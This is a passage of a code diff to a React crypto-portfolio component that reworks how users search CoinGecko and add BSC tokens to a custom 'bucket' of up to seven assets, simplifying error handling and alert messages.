-                                                            setCustomBucket(prev => ({ ...prev, tokens: [...prev.tokens, local] }));
-                                                            setCustomSearchTerm('');
-                                                            return;
-                                                        }
-
-                                                        // If not local, use simplified placeholder (since it's a raw address)
-                                                        setCustomBucket(prev => ({ 
-                                                            ...prev, 
-                                                            tokens: [...prev.tokens, { 
-                                                                symbol: 'NEW_ASSET', 
-                                                                name: 'Institutional Asset', 
-                                                                address: query, 
-                                                                image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/info/logo.png' 
-                                                            }] 
-                                                        }));
-                                                        setCustomSearchTerm('');
-                                                        return;
-                                                    }
-
-                                                    // 2. Local Pool Priority Search
-                                                    let exactLocal = tokens.find(t => t.symbol.toLowerCase() === query);
-                                                    if (exactLocal) {
-                                                        if (customBucket.tokens.length < 7 && !customBucket.tokens.find(x => x.symbol === exactLocal.symbol)) {
-                                                            setCustomBucket(prev => ({ ...prev, tokens: [...prev.tokens, exactLocal] }));
-                                                            setCustomSearchTerm('');
-                                                            setDiscoveryResults([]);
-                                                            setIsDiscoveryOpen(false);
-                                                            return;
-                                                        }
-                                                    }
-
-                                                    // 3. Global Discovery (Debounced CoinGecko Sentinel)
-                                                    clearTimeout(window.customBucketSearchTimer);
-                                                    window.customBucketSearchTimer = setTimeout(async () => {
-                                                        setSearchLoading(true);
-                                                        try {
-                                                            // Search by name/symbol via CG search endpoint
-                                                            const sRes = await axios.get(`https://api.coingecko.com/api/v3/search?query=${query}`);
-                                                            const searchList = sRes.data.coins || [];
-                                                            if (searchList.length > 0) {
-                                                                setDiscoveryResults(searchList.slice(0, 10));
-                                                                setIsDiscoveryOpen(true);
+                                                        if (match) {
+                                                            if (customBucket.tokens.length < 7) {
+                                                                if (customBucket.tokens.find(x => x.symbol === match.symbol)) return alert('Already in bucket');
+                                                                setCustomBucket({ ...customBucket, tokens: [...customBucket.tokens, match] });
+                                                                e.target.value = '';
+                                                            } else {
+                                                                alert('Mission capacity reached (Max 7 Assets).');
                                                             }
-                                                        } catch(err) { console.warn('CoinGecko node unavailable', err); }
-                                                        setSearchLoading(false);
-                                                    }, 700);
+                                                        } else {
+                                                            // NEXUS DYNAMIC DISCOVERY (COINGECKO FALLBACK)
+                                                            setSearchLoading(true);
+                                                            try {
+                                                                const sRes = await axios.get(`https://api.coingecko.com/api/v3/search?query=${query}`);
+                                                                const searchList = sRes.data.coins || [];
+                                                                
+                                                                if (searchList.length > 0) {
+                                                                    setDiscoveryResults(searchList.slice(0, 10)); // Top 10 results
+                                                                    setIsDiscoveryOpen(true);
+                                                                } else {
+                                                                    alert('Asset not discovered on B20 Nexus or BEP-20 network. Ensure valid symbol.');
+                                                                }
+                                                            } catch(err) { 
+                                                                console.warn('Nexus search fail', err);
+                                                                alert('Discovery Protocol Rate Limited. Please try again in a moment.');
+                                                            }
+                                                            setSearchLoading(false);
+                                                        }
+                                                    }
                                                 }}
                                             />
                                         </div>
                                         <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mt-5 text-center flex items-center justify-center gap-2">
-                                            {searchLoading ? <Loader2 className="w-3 h-3 animate-spin text-indigo-500" /> : (customBucket.tokens.length >= 7 ? <ShieldAlert className="w-3 h-3 text-amber-500" /> : <Info className="w-3 h-3" />)}
-                                            {searchLoading ? 'Executing Global Discovery Protocol...' : (customBucket.tokens.length >= 7 ? 'Mission Capacity Reached (7/7 Assets Locked)' : 'Type asset name or symbol for instant discovery')}
+                                            {searchLoading ? <Loader2 className="w-3 h-3 animate-spin text-indigo-500" /> : <Info className="w-3 h-3" />}
+                                            {searchLoading ? 'Executing Global Discovery Protocol...' : 'Press Enter to deploy asset to blueprint'}
                                         </p>
                                     </div>
                                     
@@ -3436,15 +3321,10 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                                         onSelect={async (coin) => {
                                             if (customBucket.tokens.length >= 7) return alert('Mission capacity reached.');
                                             setIsDiscoveryOpen(false);
-                                            setCustomSearchTerm('');
                                             setSearchLoading(true);
                                             try {
                                                 const dRes = await axios.get(`https://api.coingecko.com/api/v3/coins/${coin.id}`);
-                                                
-                                                // Handle potential missing platforms or market data
-                                                const platforms = dRes.data.platforms || {};
-                                                const addr = platforms['binance-smart-chain'] || platforms['smart-chain'];
-                                                
+                                                const addr = dRes.data.platforms?.['binance-smart-chain'];
                                                 if (addr) {
                                                     const match = {
                                                         symbol: dRes.data.symbol.toUpperCase(),
@@ -3452,23 +3332,18 @@ const SmartMoneyPortal = ({ account, signer, tokens = [], cgTrending = [] }) => 
                                                         address: addr,
                                                         image: dRes.data.image.small,
                                                         cgId: coin.id,
-                                                        current_price: dRes.data.market_data?.current_price?.usd || 0
+                                                        current_price: dRes.data.market_data.current_price.usd
                                                     };
                                                     if (customBucket.tokens.find(x => x.symbol === match.symbol)) {
-                                                        alert('Asset already initialized in your custom deployment.');
+                                                        alert('Already in bucket');
                                                     } else {
-                                                        setCustomBucket(prev => ({ ...prev, tokens: [...prev.tokens, match] }));
+                                                        setCustomBucket({ ...customBucket, tokens: [...customBucket.tokens, match] });
                                                     }
                                                 } else {
-                                                    alert('NETWORK MISMATCH: Selected asset does not exist on the BEP-20 (BSC) network. Please choose an asset with a verified BSC contract.');
+                                                    alert('Selected asset has no verified BSC liquidity source.');
                                                 }
                                             } catch(err) {
                                                 console.error('Coin detail fetch fail', err);
-                                                if (err.response?.status === 429) {
-                                                    alert('PROTOCOL SECURED: Discovery rate limit reached. Please wait 60 seconds for the node to stabilize.');
-                                                } else {
-                                                    alert('DISCOVERY FAILED: Unable to retrieve institutional metadata for this asset.');
-                                                }
                                             }
                                             setSearchLoading(false);
                                         }}
